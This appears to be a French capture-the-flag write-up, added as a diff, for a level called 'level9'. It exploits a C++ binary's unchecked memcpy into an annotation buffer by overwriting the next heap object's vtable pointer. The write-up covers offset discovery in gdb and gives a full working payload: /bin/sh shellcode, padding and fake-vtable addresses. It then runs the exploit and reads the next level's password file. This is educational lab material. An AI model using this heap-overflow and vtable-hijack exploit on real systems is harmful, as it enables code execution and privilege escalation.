@@ -1,0 +1,54 @@
+Ce binaire est ecrit en cpp. Il verifie qu'au moins un argument a ete passe, puis creer 2 objets de la classe N (N(5) et N(6))sur la heap.
+Il appel ensuite setAnnotation(av[1]) qui permet d'ajouter via memcpy() un commentaire a l'objet (c'est via cette fonction que l'on va exploiter).
+Et enfin il retourne l'addition de c'est 2 valeurs fixe (5 + 6 = 11) visible si on fait echo $? apres avoir executer le programme correctement.
+
+A savoir pour l'exploite: la classe N a 2 methode declaree virtual (operator+ et operator-).
+Ainsi chaque objet N recoit automatiqument a l'offset 0 un pointeur cache vers la vtable de la classe (une table contenant les adresse reel de ses fonctions virtuel)
+Juste apres ce pointeur ce trouve le buffer annotation[100] (offset 4) et apres lui le champs entier (nb).
+La taille total de l'objet est donc 108 octets.
+
+setAnnotation fait memcpy sans aucune verification de taille. On peut donc ecrire un texte plus long que les 100 octets prevus du buffer et deborder pour continuer d'ecrire apres l'objet a.
+Comme a et b sont alloue l'un juste apres l'autre sur la heap, ce debordement permet d'ecrire dans b et notamment d'ecraser son pointeur vtable (4 premier octets) situe juste a la fin de l'objet a.
+
+L'offset exact est determine via pattern cyclique dans gdb :
+run 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9'
+-> segfault
+
+(print/x $eax)
+Puis calcule de l'offset:
+python3 -c "
+import struct
+pattern = 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9'
+val = struct.pack('<I', $adress)
+print(pattern.find(val.decode()))
+"
+
+info registers eax
+-> eax            0x41366441      1094083649
+-> 0x41366441 -> Ad6A (conversion little endian)
+
+python3 -c "print('Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9'.find('Ad6A'))"
+-> 108
+
+
+Enfin l'exploit consiste a construire un payload qui:
+1. place un shellcode (/bin/sh) au tout debut du buffer annotation de a (adresse connue pas d'ASLR)
+2. remplit le reste du buffer jusqu'a l'offset 108
+3. ecrase le pointeur de vtable de b avec une adresse servant de fausse vtable
+4. cette adresse, place l'adresse reel du shellcode
+
+Final au lieu d'appeler operator+ le programme va sur notre shellcode.
+Structure du payload (116 octets au total) :
+
+- offset 0 à 20 (21 octets) : le shellcode, qui exécute /bin/sh
+- offset 21 à 107 (87 octets) : bourrage ("A" x 87), sert juste à avancer jusqu'au bon offset
+- offset 108 à 111 (4 octets) : 0x804a07c en little-endian -> écrase le pointeur de vtable de b avec l'adresse de notre fausse vtable
+- offset 112 à 115 (4 octets) : 0x804a00c en little-endian -> c'est l'entree de notre fausse vtable, elle contient l'adresse reelle du shellcode
+
+0x804a00c = a + 4 (le tout début du buffer annotation de a, la ou le shellcode est physiquement écrit)
+0x804a07c = b + 4 (un endroit juste après le pointeur de vtable de b, ou l'on a soi-meme place l'adresse du shellcode : notre fausse vtable à une seule entree)
+
+Commande exploit:
+./level9 "$(python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A"*87 + "\x7c\xa0\x04\x08" + "\x0c\xa0\x04\x08"')"
+whoami
+cat /home/user/bonus0/.pass
